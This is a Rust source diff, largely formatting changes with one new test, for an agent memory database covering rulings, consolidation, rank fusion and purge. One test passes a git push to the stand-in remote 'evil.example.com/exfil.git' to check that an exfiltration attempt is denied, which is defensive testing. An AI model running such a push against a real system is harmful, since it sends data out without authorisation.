             if current["status"] == "reversed" {
                 return Ok(current);
             }
@@ -16541,8 +17974,9 @@ impl Database {
                 "reversed_by": by,
             }))?,
             acted_json: "{\"status\":\"reversed\"}".to_string(),
-            forward_json: "{\"note\":\"compiled supersede guard remains; re-assert to re-litigate\"}"
-                .to_string(),
+            forward_json:
+                "{\"note\":\"compiled supersede guard remains; re-assert to re-litigate\"}"
+                    .to_string(),
             category: "court".to_string(),
             key: ruling_id.to_string(),
             entity_id: String::new(),
@@ -18315,15 +19749,16 @@ impl Database {
             ),
         };
         let mut stmt = conn.prepare(&sql)?;
-        let map_row = |r: &rusqlite::Row| -> rusqlite::Result<(String, String, String, f64, String)> {
-            Ok((
-                r.get::<_, String>(0)?,
-                r.get::<_, String>(1)?,
-                r.get::<_, String>(2)?,
-                r.get::<_, f64>(3).unwrap_or(0.5),
-                r.get::<_, String>(4).unwrap_or_default(),
-            ))
-        };
+        let map_row =
+            |r: &rusqlite::Row| -> rusqlite::Result<(String, String, String, f64, String)> {
+                Ok((
+                    r.get::<_, String>(0)?,
+                    r.get::<_, String>(1)?,
+                    r.get::<_, String>(2)?,
+                    r.get::<_, f64>(3).unwrap_or(0.5),
+                    r.get::<_, String>(4).unwrap_or_default(),
+                ))
+            };
         let rows = match ws {
             Some(ws) => stmt.query_map(
                 rusqlite::params_from_iter(vec![
@@ -18366,7 +19801,11 @@ impl Database {
                         entity_b: id2.clone(),
                         similarity: sim,
                         reason: "negation-shaped pair (token overlap + negation word)".into(),
-                        workspace_hash: if ws1 == ws2 { ws1.clone() } else { String::new() },
+                        workspace_hash: if ws1 == ws2 {
+                            ws1.clone()
+                        } else {
+                            String::new()
+                        },
                         status: "pending".into(),
                     });
                 } else if sim >= params.similarity_threshold {
@@ -18377,7 +19816,11 @@ impl Database {
                         entity_b: id2.clone(),
                         similarity: sim,
                         reason: format!("trigram similarity {sim:.3} >= threshold"),
-                        workspace_hash: if ws1 == ws2 { ws1.clone() } else { String::new() },
+                        workspace_hash: if ws1 == ws2 {
+                            ws1.clone()
+                        } else {
+                            String::new()
+                        },
                         status: "pending".into(),
                     });
                 }
@@ -18388,7 +19831,11 @@ impl Database {
         // pure: identical work, zero writes.
         if !params.dry_run {
             for p in &proposals {
-                let key = format!("{}{}", crate::sleep::STATE_PREFIX, uuid::Uuid::new_v4().simple());
+                let key = format!(
+                    "{}{}",
+                    crate::sleep::STATE_PREFIX,
+                    uuid::Uuid::new_v4().simple()
+                );
                 let value = serde_json::to_string(p)?;
                 self.state_set(&crate::models::StateEntry {
                     key,
@@ -18422,9 +19869,8 @@ impl Database {
                 force: params.force,
             };
             match self.consolidate(&cparams) {
-                Ok(rep) => serde_json::to_value(&rep).unwrap_or_else(|e| {
-                    serde_json::json!({ "error": format!("serialize: {e}") })
-                }),
+                Ok(rep) => serde_json::to_value(&rep)
+                    .unwrap_or_else(|e| serde_json::json!({ "error": format!("serialize: {e}") })),
                 Err(e) => serde_json::json!({ "error": format!("{e}") }),
             }
         } else {
@@ -20929,11 +22375,11 @@ last_accessed: {}
     /// `AND workspace_hash = ?3` guard makes the rollback safe to re-run and
     /// immune to double-application after manual edits.
     pub fn shadow_rollback(&self) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-        let entry = self
-            .state_get("shadow_promote_last")?
-            .ok_or_else(|| -> Box<dyn std::error::Error> {
+        let entry = self.state_get("shadow_promote_last")?.ok_or_else(
+            || -> Box<dyn std::error::Error> {
                 "no promote journal found — nothing to roll back".into()
-            })?;
+            },
+        )?;
         let j: serde_json::Value = serde_json::from_str(&entry.value_json)?;
         let ids: Vec<String> = j["ids"]
             .as_array()
@@ -23999,8 +25445,8 @@ pub fn reciprocal_rank_fusion(
     // exponential decay on the entity's age. half_life seconds → factor 0.5.
     let recency = recency_half_life_secs.filter(|hl| *hl > 0.0);
     // Values <= 1.0 select the legacy unbounded decay (no exponent).
-    let recency_e = (max_prior_overturn > 1.0)
-        .then(|| prior_exponent(RECENCY_PRIOR_FLOOR, max_prior_overturn));
+    let recency_e =
+        (max_prior_overturn > 1.0).then(|| prior_exponent(RECENCY_PRIOR_FLOOR, max_prior_overturn));
 
     let mut fused: Vec<_> = scores
         .into_iter()
@@ -25096,12 +26542,30 @@ pub(crate) mod tests {
         let (db, path) = temp_db();
         let fp = "deadbeef";
         let (r1, created1) = db
-            .court_ruling_record(fp, "mem-winner", "mem-loser", "accept", "importance", "importance", "receipt-1", "smoke")
+            .court_ruling_record(
+                fp,
+                "mem-winner",
+                "mem-loser",
+                "accept",
+                "importance",
+                "importance",
+                "receipt-1",
+                "smoke",
+            )
             .expect("first record");
         assert!(created1);
         assert_eq!(r1["status"], "active");
         let (r2, created2) = db
-            .court_ruling_record(fp, "mem-winner", "mem-loser", "accept", "importance", "importance", "receipt-2", "smoke")
+            .court_ruling_record(
+                fp,
+                "mem-winner",
+                "mem-loser",
+                "accept",
+                "importance",
+                "importance",
+                "receipt-2",
+                "smoke",
+            )
             .expect("idempotent re-record");
         assert!(!created2);
         assert_eq!(r1["id"], r2["id"], "same ruling returned");
@@ -25112,12 +26576,33 @@ pub(crate) mod tests {
     fn court_ruling_refuses_different_winner_while_active() {
         let (db, path) = temp_db();
         let fp = "feedface";
-        db.court_ruling_record(fp, "mem-winner", "mem-loser", "accept", "", "importance", "r", "smoke")
-            .expect("record");
+        db.court_ruling_record(
+            fp,
+            "mem-winner",
+            "mem-loser",
+            "accept",
+            "",
+            "importance",
+            "r",
+            "smoke",
+        )
+        .expect("record");
         let err = db
-            .court_ruling_record(fp, "mem-other", "mem-loser", "accept", "", "importance", "r", "smoke")
+            .court_ruling_record(
+                fp,
+                "mem-other",
+                "mem-loser",
+                "accept",
+                "",
+                "importance",
+                "r",
+                "smoke",
+            )
             .expect_err("different winner must be refused while active");
-        assert!(err.to_string().contains("reverse it before re-ruling"), "{err}");
+        assert!(
+            err.to_string().contains("reverse it before re-ruling"),
+            "{err}"
+        );
         let _ = std::fs::remove_file(path);
     }
 
@@ -25126,14 +26611,37 @@ pub(crate) mod tests {
         let (db, path) = temp_db();
         let fp = "cafebabe";
         let (r1, _) = db
-            .court_ruling_record(fp, "mem-winner", "mem-loser", "accept", "", "importance", "r", "smoke")
+            .court_ruling_record(
+                fp,
+                "mem-winner",
+                "mem-loser",
+                "accept",
+                "",
+                "importance",
+                "r",
+                "smoke",
+            )
             .expect("record");
         assert!(db.court_ruling_find_active(fp).unwrap().is_some());
-        let rev = db.court_ruling_reverse(&r1["id"].as_str().unwrap(), "operator").expect("reverse");
+        let rev = db
+            .court_ruling_reverse(&r1["id"].as_str().unwrap(), "operator")
+            .expect("reverse");
         assert_eq!(rev["status"], "reversed");
-        assert!(db.court_ruling_find_active(fp).unwrap().is_none(), "pair reopened");
+        assert!(
+            db.court_ruling_find_active(fp).unwrap().is_none(),
+            "pair reopened"
+        );
         let (r2, created) = db
-            .court_ruling_record(fp, "mem-other", "mem-loser", "accept", "", "importance", "r", "smoke")
+            .court_ruling_record(
+                fp,
+                "mem-other",
+                "mem-loser",
+                "accept",
+                "",
+                "importance",
+                "r",
+                "smoke",
+            )
             .expect("re-record after reverse");
         assert!(created);
         assert_ne!(r1["id"], r2["id"]);
@@ -25144,13 +26652,28 @@ pub(crate) mod tests {
     fn court_ruling_reverse_is_idempotent_and_rejects_missing() {
         let (db, path) = temp_db();
         let (r1, _) = db
-            .court_ruling_record("aa11", "mem-winner", "mem-loser", "accept", "", "importance", "r", "smoke")
+            .court_ruling_record(
+                "aa11",
+                "mem-winner",
+                "mem-loser",
+                "accept",
+                "",
+                "importance",
+                "r",
+                "smoke",
+            )
             .expect("record");
-        let rev = db.court_ruling_reverse(&r1["id"].as_str().unwrap(), "op").expect("reverse");
-        let rev2 = db.court_ruling_reverse(&r1["id"].as_str().unwrap(), "op").expect("reverse again");
+        let rev = db
+            .court_ruling_reverse(&r1["id"].as_str().unwrap(), "op")
+            .expect("reverse");
+        let rev2 = db
+            .court_ruling_reverse(&r1["id"].as_str().unwrap(), "op")
+            .expect("reverse again");
         assert_eq!(rev["status"], rev2["status"]);
         assert_eq!(rev["status"], "reversed");
-        let err = db.court_ruling_reverse("rul-nope", "op").expect_err("missing id");
+        let err = db
+            .court_ruling_reverse("rul-nope", "op")
+            .expect_err("missing id");
         assert!(err.to_string().contains("no ruling with id"), "{err}");
         let _ = std::fs::remove_file(path);
     }
@@ -25158,15 +26681,41 @@ pub(crate) mod tests {
     #[test]
     fn court_ruling_list_filters_by_status() {
         let (db, path) = temp_db();
-        db.court_ruling_record("fp-1", "mem-a", "mem-b", "accept", "", "importance", "r", "smoke").expect("r1");
-        let (r2, _) = db.court_ruling_record("fp-2", "mem-c", "mem-d", "accept", "", "importance", "r", "smoke").expect("r2");
-        db.court_ruling_reverse(&r2["id"].as_str().unwrap(), "op").expect("rev");
+        db.court_ruling_record(
+            "fp-1",
+            "mem-a",
+            "mem-b",
+            "accept",
+            "",
+            "importance",
+            "r",
+            "smoke",
+        )
+        .expect("r1");
+        let (r2, _) = db
+            .court_ruling_record(
+                "fp-2",
+                "mem-c",
+                "mem-d",
+                "accept",
+                "",
+                "importance",
+                "r",
+                "smoke",
+            )
+            .expect("r2");
+        db.court_ruling_reverse(&r2["id"].as_str().unwrap(), "op")
+            .expect("rev");
         let all = db.court_ruling_list(None, 10).expect("list all");
         assert_eq!(all.len(), 2);
-        let active = db.court_ruling_list(Some("active"), 10).expect("list active");
+        let active = db
+            .court_ruling_list(Some("active"), 10)
+            .expect("list active");
         assert_eq!(active.len(), 1);
         assert_eq!(active[0]["pair_fingerprint"], "fp-1");
-        let reversed = db.court_ruling_list(Some("reversed"), 10).expect("list reversed");
+        let reversed = db
+            .court_ruling_list(Some("reversed"), 10)
+            .expect("list reversed");
         assert_eq!(reversed.len(), 1);
         assert_eq!(reversed[0]["pair_fingerprint"], "fp-2");
         let _ = std::fs::remove_file(path);
@@ -26221,6 +27770,7 @@ pub(crate) mod tests {
                 "action-42",
                 "a".repeat(64).as_str(),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         assert_eq!(intent.status, "approval_requested");
@@ -26267,6 +27817,7 @@ pub(crate) mod tests {
                 "act-1",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap_err()
             .to_string();
@@ -26291,6 +27842,7 @@ pub(crate) mod tests {
                 "act-2",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap_err()
             .to_string();
@@ -26318,6 +27870,7 @@ pub(crate) mod tests {
                 "act-3",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap_err()
             .to_string();
@@ -26342,6 +27895,7 @@ pub(crate) mod tests {
                 "act-4",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         assert_eq!(ok.status, "intent");
@@ -26420,6 +27974,7 @@ pub(crate) mod tests {
                 "push-768",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         assert_eq!(action.manifest_version, stored.version);
@@ -26551,13 +28106,17 @@ pub(crate) mod tests {
 
         // Benign argv: allowed, completes normally.
         let benign = db.action_intent("agent-836", "ws-836", "github:Perseus-Computing-LLC/perseus-vault", "github:Perseus-Computing-LLC/ledger", "tool.run", "run-1", &"a".repeat(64),
-            Some("{\"tool\":\"git\",\"argv_canonical\":{\"action\":\"push\",\"remote\":\"github.com/Perseus-Computing-LLC/ledger.git\"}}")).unwrap();
+            Some("{\"tool\":\"git\",\"argv_canonical\":{\"action\":\"push\",\"remote\":\"github.com/Perseus-Computing-LLC/ledger.git\"}}"),
+                &[],
+            ).unwrap();
         assert_eq!(benign.status, "intent");
 
         // Escalation argv (exfiltration remote): explicit denied receipt, no
         // capability granted.
         let escalation = db.action_intent("agent-836", "ws-836", "github:Perseus-Computing-LLC/perseus-vault", "github:Perseus-Computing-LLC/ledger", "tool.run", "run-2", &"b".repeat(64),
-            Some("{\"tool\":\"git\",\"argv_canonical\":{\"action\":\"push\",\"remote\":\"evil.example.com/exfil.git\"}}")).unwrap();
+            Some("{\"tool\":\"git\",\"argv_canonical\":{\"action\":\"push\",\"remote\":\"evil.example.com/exfil.git\"}}"),
+                &[],
+            ).unwrap();
         assert_eq!(escalation.status, "denied");
         assert_eq!(
             escalation.outcome_hash.len(),
@@ -26619,6 +28178,7 @@ pub(crate) mod tests {
                 "run-1",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         assert_eq!(action.status, "approval_requested");
@@ -26678,6 +28238,7 @@ pub(crate) mod tests {
                 "run-1",
                 &"a".repeat(64),
                 Some("{}"),
+                &[],
             )
             .unwrap();
         assert_eq!(action.status, "approval_requested");
@@ -31655,8 +33216,13 @@ pub(crate) mod tests {
         let (mut db, path) = temp_db();
         let (key_path, _) = temp_key_file();
         db.set_encryption(&key_path).unwrap();
-        db.remember(&make_entity("r-1", "note", "r-1", r#"{"vault":"pre-rebrand"}"#))
-            .unwrap();
+        db.remember(&make_entity(
+            "r-1",
+            "note",
+            "r-1",
+            r#"{"vault":"pre-rebrand"}"#,
+        ))
+        .unwrap();
         rewrite_canary_to_legacy_rebrand_aad(&db, &key_path);
         drop(db);
 
@@ -31678,8 +33244,13 @@ pub(crate) mod tests {
         let (mut db, path) = temp_db();
         let (key_a, _) = temp_key_file();
         db.set_encryption(&key_a).unwrap();
-        db.remember(&make_entity("r-2", "note", "r-2", r#"{"vault":"pre-rebrand"}"#))
-            .unwrap();
+        db.remember(&make_entity(
+            "r-2",
+            "note",
+            "r-2",
+            r#"{"vault":"pre-rebrand"}"#,
+        ))
+        .unwrap();
         rewrite_canary_to_legacy_rebrand_aad(&db, &key_a);
         drop(db);
 
@@ -31702,8 +33273,13 @@ pub(crate) mod tests {
         let (mut db, path) = temp_db();
         let (key_path, _) = temp_key_file();
         db.set_encryption(&key_path).unwrap();
-        db.remember(&make_entity("r-3", "note", "r-3", r#"{"vault":"pre-rebrand"}"#))
-            .unwrap();
+        db.remember(&make_entity(
+            "r-3",
+            "note",
+            "r-3",
+            r#"{"vault":"pre-rebrand"}"#,
+        ))
+        .unwrap();
         rewrite_canary_to_legacy_rebrand_aad(&db, &key_path);
 
         // rekey-aad is the deliberate migration path: it must also bring the
@@ -31738,7 +33314,10 @@ pub(crate) mod tests {
         assert_eq!(report2.0, 0);
         assert_eq!(report2.1, 1);
         assert_eq!(report2.2, 0);
-        assert_eq!(report2.3, 0, "re-running rekey-aad must not re-migrate the canary");
+        assert_eq!(
+            report2.3, 0,
+            "re-running rekey-aad must not re-migrate the canary"
+        );
         let _ = std::fs::remove_file(&key_path);
         let _ = fs::remove_file(&path);
     }
@@ -35881,6 +37460,50 @@ pub(crate) mod tests {
         let _ = fs::remove_file(&path);
     }
 
+    // #1030: a HYBRID query with no dense leg available (embedding tier off,
+    // no fingerprint tier) degrades to the sparse arm with an explicit
+    // degraded marker — integrations on lean binaries still get keyword
+    // hits instead of a hard error or a silent empty. Dense keeps the
+    // hard error (previous test).
+    #[test]
+    fn hybrid_recall_without_dense_leg_degrades_to_sparse_with_marker() {
+        let (mut db, path) = temp_db();
+        db.embedding_config.enabled = false;
+        db.set_embedding_fingerprint(false);
+        // Seed through the real write path so the FTS index sees the row.
+        crate::tools::handle_remember(
+            &db,
+            serde_json::json!({
+                "category": "insight",
+                "key": "alpha",
+                "body_json": "{\"content\":\"alpha beta\"}",
+            }),
+        )
+        .expect("remember should succeed");
+
+        let (entities, completeness) = db
+            .recall_with_completeness(&RecallParams {
+                query: "alpha".to_string(),
+                mode: crate::models::SearchMode::Hybrid,
+                limit: 5,
+                skip_side_effects: true,
+                ..RecallParams::default()
+            })
+            .unwrap();
+
+        assert_eq!(entities.len(), 1, "hybrid must serve the sparse arm");
+        assert_eq!(entities[0].key, "alpha");
+        let degraded = completeness
+            .degraded
+            .expect("degraded marker must be present when the dense leg is missing");
+        assert!(
+            degraded.contains("embedding backend"),
+            "degraded reason should name the missing backend, got: {degraded}"
+        );
+
+        let _ = fs::remove_file(&path);
+    }
+
     // #1020: strict flag parse — documented spellings accepted, garbage
     // rejected (fail-closed, never a silent off).
     #[test]
@@ -36433,7 +38056,10 @@ pub(crate) mod tests {
             "the fresh row is already on the new scheme"
         );
         assert_eq!(failed, 0);
-        assert_eq!(canary_migrated, 0, "the canary is already on the current AAD");
+        assert_eq!(
+            canary_migrated, 0,
+            "the canary is already on the current AAD"
+        );
 
         // Still reads correctly after migration, and the raw column is now
         // encrypted under the new scheme (decryptable via build_aad alone).
@@ -36603,8 +38229,16 @@ pub(crate) mod tests {
         let sparse: Vec<(Entity, f64)> = vec![];
 
         // Relevance-only (default): the older, more-relevant entity ranks first.
-        let baseline =
-            crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 10, 1.0, None, MAX_PRIOR_OVERTURN_DEFAULT, now);
+        let baseline = crate::db::reciprocal_rank_fusion(
+            &dense,
+            &sparse,
+            60.0,
+            10,
+            1.0,
+            None,
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            now,
+        );
         assert_eq!(
             baseline[0].0.id, "old",
             "without recency, the top-relevance entity must win"
@@ -36613,16 +38247,32 @@ pub(crate) mod tests {
         // With a 1-day half-life, the 100-day-old hit is decayed to ~0 and the
         // brand-new entity overtakes it.
         let hl = day_ms as f64 / 1000.0;
-        let boosted =
-            crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 10, 1.0, Some(hl), MAX_PRIOR_OVERTURN_DEFAULT, now);
+        let boosted = crate::db::reciprocal_rank_fusion(
+            &dense,
+            &sparse,
+            60.0,
+            10,
+            1.0,
+            Some(hl),
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            now,
+        );
         assert_eq!(
             boosted[0].0.id, "fresh",
             "recency boost must promote the newer entity"
         );
 
         // A non-positive half-life is treated as disabled (no-op) — same as None.
-        let disabled =
-            crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 10, 1.0, Some(0.0), MAX_PRIOR_OVERTURN_DEFAULT, now);
+        let disabled = crate::db::reciprocal_rank_fusion(
+            &dense,
+            &sparse,
+            60.0,
+            10,
+            1.0,
+            Some(0.0),
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            now,
+        );
         assert_eq!(
             disabled[0].0.id, "old",
             "hl <= 0 must disable recency weighting"
@@ -36640,7 +38290,16 @@ pub(crate) mod tests {
         let dense = vec![(unset, 0.5)];
         let sparse: Vec<(Entity, f64)> = vec![];
 
-        let out = crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 10, 1.0, Some(1.0), MAX_PRIOR_OVERTURN_DEFAULT, now);
+        let out = crate::db::reciprocal_rank_fusion(
+            &dense,
+            &sparse,
+            60.0,
+            10,
+            1.0,
+            Some(1.0),
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            now,
+        );
         let expected = 1.0 / (60.0 + 1.0); // rank-0 RRF, unscaled
         assert!(
             (out[0].1 - expected).abs() < 1e-12,
@@ -36729,7 +38388,12 @@ pub(crate) mod tests {
             // Fillers are as old as `old` (same recency penalty): the ranking
             // is relevance-only among the penalized set, so the gap between
             // old-r1 and fresh-r200 is the only signal.
-            let mut f = make_entity(&format!("filler-{i}"), "insight", &format!("filler-{i}"), r#"{"n":"x"}"#);
+            let mut f = make_entity(
+                &format!("filler-{i}"),
+                "insight",
+                &format!("filler-{i}"),
+                r#"{"n":"x"}"#,
+            );
             f.created_at_unix_ms = now - 100 * day_ms;
             dense.push((f, 0.5));
         }
@@ -36740,7 +38404,14 @@ pub(crate) mod tests {
         // Default bound (2.0): the >2× relevance gap survives the max recency
         // penalty (old keeps >= half its fused score).
         let bounded = crate::db::reciprocal_rank_fusion(
-            &dense, &sparse, 60.0, 210, 1.0, Some(hl), MAX_PRIOR_OVERTURN_DEFAULT, now,
+            &dense,
+            &sparse,
+            60.0,
+            210,
+            1.0,
+            Some(hl),
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            now,
         );
         assert_eq!(
             bounded[0].0.id, "old-r1",
@@ -36748,18 +38419,16 @@ pub(crate) mod tests {
         );
 
         // Widened bound (64): the recency prior may now overturn the gap.
-        let wide = crate::db::reciprocal_rank_fusion(
-            &dense, &sparse, 60.0, 210, 1.0, Some(hl), 64.0, now,
-        );
+        let wide =
+            crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 210, 1.0, Some(hl), 64.0, now);
         assert_eq!(
             wide[0].0.id, "fresh-r200",
             "a 64x bound must let recency overturn the relevance gap"
         );
 
         // Legacy (<= 0): unbounded decay — old is crushed to ~0 regardless.
-        let legacy = crate::db::reciprocal_rank_fusion(
-            &dense, &sparse, 60.0, 210, 1.0, Some(hl), 0.0, now,
-        );
+        let legacy =
+            crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 210, 1.0, Some(hl), 0.0, now);
         assert_eq!(
             legacy[0].0.id, "fresh-r200",
             "legacy unbounded recency must crush the 100-day-old hit"
@@ -36832,7 +38501,16 @@ pub(crate) mod tests {
         // Keyword arm ranks an irrelevant entity first.
         let sparse = vec![(noise, 5.0)];
 
-        let fused = crate::db::reciprocal_rank_fusion(&dense, &sparse, 60.0, 10, 0.0, None, MAX_PRIOR_OVERTURN_DEFAULT, 0);
+        let fused = crate::db::reciprocal_rank_fusion(
+            &dense,
+            &sparse,
+            60.0,
+            10,
+            0.0,
+            None,
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            0,
+        );
         assert_eq!(
             fused[0].0.id, "dense-top",
             "a weight-0 keyword arm must not displace the dense rank-1 hit"
@@ -36844,7 +38522,16 @@ pub(crate) mod tests {
         let noise2 = make_entity("kw-noise", "insight", "k3", r#"{"n":"c"}"#);
         let dense2 = vec![(want2, 0.91)];
         let sparse2 = vec![(noise2, 5.0)];
-        let tied = crate::db::reciprocal_rank_fusion(&dense2, &sparse2, 60.0, 10, 1.0, None, MAX_PRIOR_OVERTURN_DEFAULT, 0);
+        let tied = crate::db::reciprocal_rank_fusion(
+            &dense2,
+            &sparse2,
+            60.0,
+            10,
+            1.0,
+            None,
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            0,
+        );
         // Both rank-0 in their arm → equal fused score → id tie-break (asc).
         assert_eq!(tied[0].0.id, "dense-top");
         assert_eq!(tied[1].0.id, "kw-noise");
@@ -36867,7 +38554,16 @@ pub(crate) mod tests {
                 0.5, // identical scores → identical RRF ranks → all tied
             ));
         }
-        let first = crate::db::reciprocal_rank_fusion(&dense, &[], 60.0, 10, 0.0, None, MAX_PRIOR_OVERTURN_DEFAULT, 0);
+        let first = crate::db::reciprocal_rank_fusion(
+            &dense,
+            &[],
+            60.0,
+            10,
+            0.0,
+            None,
+            MAX_PRIOR_OVERTURN_DEFAULT,
+            0,
+        );
         let order: Vec<String> = first.iter().map(|(e, _)| e.id.clone()).collect();
         // All scores equal, so id order must be ascending and stable.
         let mut sorted = order.clone();
@@ -36877,7 +38573,16 @@ pub(crate) mod tests {
             "all-tied results must be ordered by id ascending"
         );
         for _ in 0..50 {
-            let again = crate::db::reciprocal_rank_fusion(&dense, &[], 60.0, 10, 0.0, None, MAX_PRIOR_OVERTURN_DEFAULT, 0);
+            let again = crate::db::reciprocal_rank_fusion(
+                &dense,
+                &[],
+                60.0,
+                10,
+                0.0,
+                None,
+                MAX_PRIOR_OVERTURN_DEFAULT,
+                0,
+            );
             let again_order: Vec<String> = again.iter().map(|(e, _)| e.id.clone()).collect();
             assert_eq!(again_order, order, "fused tie order must be deterministic");
         }
@@ -36952,7 +38657,7 @@ pub(crate) mod tests {
             requesting_agent_id: String::new(),
             refine_existing: true,
             quote_cap_chars: 512,
-        force: false,
+            force: false,
         };
         let report = db.consolidate(&params).unwrap();
 
@@ -37045,7 +38750,7 @@ pub(crate) mod tests {
             requesting_agent_id: String::new(),
             refine_existing: true,
             quote_cap_chars: 512,
-        force: false,
+            force: false,
         };
         let report = db.consolidate(&params).unwrap();
         assert_eq!(report.observations_created, 1);
@@ -37088,7 +38793,7 @@ pub(crate) mod tests {
             requesting_agent_id: String::new(),
             refine_existing: true,
             quote_cap_chars: 512,
-        force: false,
+            force: false,
         };
         let report = db.consolidate(&params).unwrap();
         assert_eq!(
@@ -37148,7 +38853,7 @@ pub(crate) mod tests {
                 requesting_agent_id: String::new(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap();
         assert_eq!(report.observations_created, 1);
@@ -37264,7 +38969,7 @@ pub(crate) mod tests {
                 requesting_agent_id: String::new(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap();
         assert_eq!(report.observations_created, 1);
@@ -37296,7 +39001,7 @@ pub(crate) mod tests {
             requesting_agent_id: String::new(),
             refine_existing: true,
             quote_cap_chars: 512,
-        force: false,
+            force: false,
         };
         let err = db.consolidate(&params).unwrap_err().to_string();
         assert!(
@@ -37326,7 +39031,7 @@ pub(crate) mod tests {
             requesting_agent_id: String::new(),
             refine_existing: true,
             quote_cap_chars: 512,
-        force: false,
+            force: false,
         };
         let err3 = db.consolidate(&amb2).unwrap_err().to_string();
         assert!(err3.contains("mutually exclusive"), "{err3}");
@@ -37371,7 +39076,7 @@ pub(crate) mod tests {
                 requesting_agent_id: String::new(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap();
 
@@ -37421,7 +39126,7 @@ pub(crate) mod tests {
                 requesting_agent_id: String::new(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap();
         assert_eq!(report2.entities_examined, 1);
@@ -37467,7 +39172,7 @@ pub(crate) mod tests {
                 requesting_agent_id: String::new(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap();
         assert_eq!(report.observations_created, 1);
@@ -37537,7 +39242,7 @@ pub(crate) mod tests {
                 requesting_agent_id: "sweeper".to_string(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap();
 
@@ -37594,7 +39299,7 @@ pub(crate) mod tests {
                 requesting_agent_id: "ghost".to_string(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap_err()
             .to_string();
@@ -37618,7 +39323,7 @@ pub(crate) mod tests {
                 requesting_agent_id: "ghost".to_string(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .is_ok();
         assert!(ok, "scoped runs must not require a manifest");
@@ -37660,7 +39365,7 @@ pub(crate) mod tests {
                 requesting_agent_id: "maintainer".to_string(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .unwrap_err()
             .to_string();
@@ -37684,7 +39389,7 @@ pub(crate) mod tests {
                 requesting_agent_id: "maintainer".to_string(),
                 refine_existing: true,
                 quote_cap_chars: 512,
-            force: false,
+                force: false,
             })
             .is_ok();
         assert!(ok, "scoped runs must not require the global capability");
@@ -37707,7 +39412,7 @@ pub(crate) mod tests {
             requesting_agent_id: String::new(),
             refine_existing: true,
             quote_cap_chars: 512,
-        force: false,
+            force: false,
         }
     }
 
@@ -43156,7 +44861,6 @@ pub(crate) mod tests {
     #[test]
     // ─── #990: deletion-residue accounting ──────────────────────────────
     // Contract: docs/specs/deletion-residue-accounting.md.
-
     #[test]
     fn purge_cleans_embedding_snapshot_and_projection_basis_for_doomed() {
         let (db, _path) = temp_db();
@@ -43215,7 +44919,10 @@ pub(crate) mod tests {
             sweep.orphan_embedding_snapshot_rows,
             vec!["ghost-990".to_string()]
         );
-        assert_eq!(sweep.orphan_projection_basis_rows, vec!["ghost-p".to_string()]);
+        assert_eq!(
+            sweep.orphan_projection_basis_rows,
+            vec!["ghost-p".to_string()]
+        );
         assert!(!sweep.hard_gate_passed);
         assert_eq!(sweep.undeclared_total, 2);
     }
@@ -43223,8 +44930,13 @@ pub(crate) mod tests {
     #[test]
     fn purge_fails_closed_on_undeclared_residual_and_rolls_back() {
         let (db, _path) = temp_db();
-        db.remember(&make_entity("e-rs2", "insight", "residue-rs2", r#"{"v":1}"#))
-            .unwrap();
+        db.remember(&make_entity(
+            "e-rs2",
+            "insight",
+            "residue-rs2",
+            r#"{"v":1}"#,
+        ))
+        .unwrap();
         db.forget("insight", "residue-rs2", "test").unwrap();
         // Pre-existing undeclared residue unrelated to this purge's doomed set.
         db.conn()
@@ -43241,7 +44953,11 @@ pub(crate) mod tests {
         let count: i64 = db
             .conn()
             .unwrap()
-            .query_row("SELECT COUNT(*) FROM entities WHERE id = 'e-rs2'", [], |r| r.get(0))
+            .query_row(
+                "SELECT COUNT(*) FROM entities WHERE id = 'e-rs2'",
+                [],
+                |r| r.get(0),
+            )
             .unwrap();
         assert_eq!(count, 1);
     }
@@ -43249,8 +44965,13 @@ pub(crate) mod tests {
     #[test]
     fn dry_run_previews_residue_partition_without_deleting() {
         let (db, _path) = temp_db();
-        db.remember(&make_entity("e-rs3", "insight", "residue-rs3", r#"{"v":1}"#))
-            .unwrap();
+        db.remember(&make_entity(
+            "e-rs3",
+            "insight",
+            "residue-rs3",
+            r#"{"v":1}"#,
+        ))
+        .unwrap();
         db.forget("insight", "residue-rs3", "test").unwrap();
         let report = db.purge(true).unwrap();
         assert!(report.dry_run);
@@ -43259,7 +44980,11 @@ pub(crate) mod tests {
         let count: i64 = db
             .conn()
             .unwrap()
-            .query_row("SELECT COUNT(*) FROM entities WHERE id = 'e-rs3'", [], |r| r.get(0))
+            .query_row(
+                "SELECT COUNT(*) FROM entities WHERE id = 'e-rs3'",
+                [],
+                |r| r.get(0),
+            )
             .unwrap();
         assert_eq!(count, 1, "dry run must not delete");
     }
